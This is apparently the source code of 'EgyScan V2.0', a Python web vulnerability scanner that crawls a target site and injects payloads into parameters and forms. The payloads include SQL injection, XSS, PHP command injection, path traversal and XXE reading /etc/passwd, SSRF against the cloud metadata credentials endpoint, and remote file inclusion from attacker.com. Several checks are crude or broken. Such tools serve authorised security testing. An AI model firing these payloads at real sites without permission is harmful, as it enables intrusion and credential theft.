import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from itertools import islice
from urllib.robotparser import RobotFileParser
from bs4 import MarkupResemblesLocatorWarning
import time
import logging
import tqdm
import warnings
import random

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Add more user agents if desired
]

ALLOWED_HOSTS = ["www.google.com"]

logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")

def print_logo():
    logo = """
    ███████╗██╗   ██╗██████╗ ███████╗██████╗  █████╗ ██████╗ ██╗     ███████╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║██████╔╝██║     █████╗  
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║     ██╔══╝  
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██████╔╝███████╗███████╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
    """
    print(logo)
    glow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    interval = 0.5  # Time interval between color changes (in seconds)

    for color in glow_colors:
        print(color + logo)
        time.sleep(interval)


MAX_WORKERS = 20

payloads = ["'", "\"", "<script>alert('XSS')</script>", "<?php system('id'); ?>", "../../../../etc/passwd"]

def check_sqli(url):
    response = requests.get(url)
    if response.status_code == 200 and ("error in SQL syntax" in response.text or "mysql_fetch_array" in response.text or "/var/www" in response.text or "on line" in response.text or " Trying to access array offset on value of type" in response.text or " at line" in response.text):
        return True
    return False


def check_rce(url):
    response = requests.get(url)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False


def check_xss(url):
    response = requests.get(url)
    if response.status_code == 200 and "XSS" in response.text:
        return True
    return False


def check_lfi(url):
    response = requests.get(url)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False


def check_open_redirect(url):
    payload = "http://www.google.com"
    sanitized_url = urljoin(url, payload)
    parsed_url = urlparse(sanitized_url)

    if parsed_url.netloc in ALLOWED_HOSTS:
        response = requests.get(sanitized_url)
        if response.status_code == 302 and urlparse(response.url).netloc == "www.google.com":
            return True

    return False

def check_backup_files(url):
    extensions = [".bak", ".zip", ".tgz"]
    parsed_url = urlparse(url)

    for extension in extensions:
        backup_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{parsed_url.path}{extension}"
        if extension in parsed_url.path:
            response = requests.get(backup_url)
            if response.status_code == 200:
                return True

    return False


def check_database_exposure(url):
    endpoints = ["phpmyadmin", "adminer", "dbadmin"]
    for endpoint in endpoints:
        response = requests.get(url + "/" + endpoint)
        if response.status_code == 302:
            return True
    return False


def check_directory_listings(url):
    response = requests.get(url)
    if response.status_code == 200 and "Index of" in response.text:
        return True
    return False


def check_sensitive_information(url):
    keywords = ["private_key", "credit_card", "api_key", "secret_key"]
    response = requests.get(url)
    for keyword in keywords:
        if keyword in response.text:
            return True
    return False
    
def check_log_files(url):
    log_files = ["access.log", "error.log"]
    parsed_url = urlparse(url)

    for log_file in log_files:
        log_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{log_file}"
        response = requests.get(log_url)
        if response.status_code == 200 and "log content" in response.text:
            return True

    return False
    
def check_xxe(url):
    payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
    response = requests.post(url, data=payload)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False

def check_ssrf(url):
    payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
    response = requests.get(url + "?url=" + payload)
    if response.status_code == 200 and "AccessDenied" not in response.text:
        return True
    return False

def check_rfi(url):
    payload = "http://attacker.com/malicious_script.php"
    response = requests.get(url + "?file=" + payload)
    if response.status_code == 200 and "Malicious script executed" in response.text:
        return True
    return False



session = requests.Session()
session.headers = {
    "User-Agent": random.choice(USER_AGENTS),
    # Add other headers if desired
}




def extract_urls_from_html(html, base_url):
    try:
        soup = BeautifulSoup(html, "html.parser")
        urls = set()
        for anchor in soup.find_all("a"):
            href = anchor.get("href")
            if href:
                href = urljoin(base_url, href)
                urls.add(href)
        return urls
    except bs4.FeatureNotFound:
        return set()


def collect_urls(target_url):
    parsed_url = urlparse(target_url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    urls = set()
    processed_urls = set()

    urls.add(target_url)

    with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            while urls:
                current_url = urls.pop()
                
                if current_url in processed_urls:
                    continue

                processed_urls.add(current_url)
                
                try:
                    response = requests.get(current_url)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, "html.parser")
                        for link in soup.find_all("a"):
                            href = link.get("href")
                            if href:
                                absolute_url = urljoin(base_url, href)
                                if absolute_url.startswith(base_url):
                                    urls.add(absolute_url)
                except requests.exceptions.RequestException:
                    continue

                pbar.update(1)

    return processed_urls

def filter_urls(urls, target_domain, processed_urls):
    filtered_urls = set()
    for url in urls:
        parsed_url = urlparse(url)
        if parsed_url.netloc == target_domain and url not in processed_urls:
            filtered_urls.add(url)
    return filtered_urls


def inject_payloads(url):
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    params = parse_qs(parsed_url.query)

    processed_parameters = set()
    for param in params:
        if param in processed_parameters:
            continue

        processed_parameters.add(param)

        for payload in payloads:
            injected_params = params.copy()
            param_values = injected_params.get(param)
            if param_values is not None:
                injected_params[param] = [param_value + payload for param_value in param_values]
                injected_url = url.split("?")[0] + "?" + "&".join(
                    f"{key}={value}" for key, value in injected_params.items()
                )
                scan_url(injected_url)

    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        form_action = form.get("action")
        if form_action:
            if not form_action.startswith("http"):
                form_action = urljoin(base_url, form_action)

            form_inputs = form.find_all(["input", "textarea"])
            form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}

            processed_fields = set()
            for field in form_data:
                if field in processed_fields:
                    continue

                processed_fields.add(field)

                for payload in payloads:
                    injected_fields = form_data.copy()
                    field_value = injected_fields.get(field)
                    if field_value is not None:
                        injected_fields[field] = field_value + payload
                        response = requests.post(form_action, data=injected_fields)
                        scan_response(response)


def scan_url(url):
    if check_sqli(url):
        logging.warning(f"SQLI: {url}")
    if check_rce(url):
        logging.warning(f"RCE: {url}")
    if check_xss(url):
        logging.warning(f"XSS: {url}")
    if check_lfi(url):
        logging.warning(f"LFI: {url}")
    if check_open_redirect(url):
        logging.warning(f"Open Redirect: {url}")
    if check_backup_files(url):
        logging.warning(f"Backup Files: {url}")
    if check_database_exposure(url):
        logging.warning(f"Database Exposure: {url}")
    if check_directory_listings(url):
        logging.warning(f"Directory Listings: {url}")
    if check_sensitive_information(url):
        logging.warning(f"Sensitive Information exposure: {url}")
    if check_xxe(url):
        logging.warning(f"XXE: {url}")
    if check_ssrf(url):
        logging.warning(f"SSRF: {url}")
    if check_rfi(url):
        logging.warning(f"RFI: {url}")
    if check_log_files(url):
        logging.warning(f"Log File Disclosure: {url}")


def scan_response(response):
    if check_sqli(response.url):
        logging.warning(f"SQLI: {response.url}")
    if check_rce(response.url):
        logging.warning(f"RCE: {response.url}")
    if check_xss(response.url):
        logging.warning(f"XSS: {response.url}")
    if check_lfi(response.url):
        logging.warning(f"LFI: {response.url}")
    if check_open_redirect(response.url):
        logging.warning(f"Open Redirect: {response.url}")
    if check_backup_files(response.url):
        logging.warning(f"Backup Files: {response.url}")
    if check_database_exposure(response.url):
        logging.warning(f"Database Exposure: {response.url}")
    if check_directory_listings(response.url):
        logging.warning(f"Directory Listings: {response.url}")
    if check_sensitive_information(response.url):
        logging.warning(f"Sensitive Information: {response.url}")
    if check_xxe(response.url):
        logging.warning(f"XXE: {response.url}")
    if check_ssrf(response.url):
        logging.warning(f"SSRF: {response.url}")
    if check_rfi(response.url):
        logging.warning(f"RFI: {response.url}")
    if check_log_files(response.url):
        logging.warning(f"Log File Disclosure: {response.url}")


def print_colorful(message, color=Fore.GREEN):
    print(color + message + Style.RESET_ALL)

def print_warning(message):
    print(Fore.YELLOW + "Warning: " + message + Style.RESET_ALL)

def print_error(message):
    print(Fore.RED + "Error: " + message + Style.RESET_ALL)

def print_info(message):
    print(Fore.BLUE + "Info: " + message + Style.RESET_ALL)

def main():
    print_colorful("EgyScan V2.0", Fore.YELLOW)
    target_url = input("Enter the target URL to scan for vulnerabilities: ")

    print_logo()
    print_colorful("EgyScan V2.0", Fore.YELLOW)
    print_colorful("https://github.com/dragonked2/Egyscan", Fore.BLUE)

    print_info("Collecting URLs from the target website...")
    urls = collect_urls(target_url)

    print_colorful(f"Found {len(urls)} URLs to scan.", Fore.CYAN)

    print_info("Scanning collected URLs for vulnerabilities...")
    with tqdm.tqdm(total=len(urls), desc="Scanning URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(scan_url, url) for url in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error occurred while scanning URL: {e}")

    print_info("Injecting payloads into parameters, query, and form inputs...")
    with tqdm.tqdm(total=len(urls), desc="Injecting Payloads", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(inject_payloads, url) for url in urls]

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error occurred while injecting payloads: {e}")

    logging.info("Scanning completed!")

if __name__ == "__main__":
    main()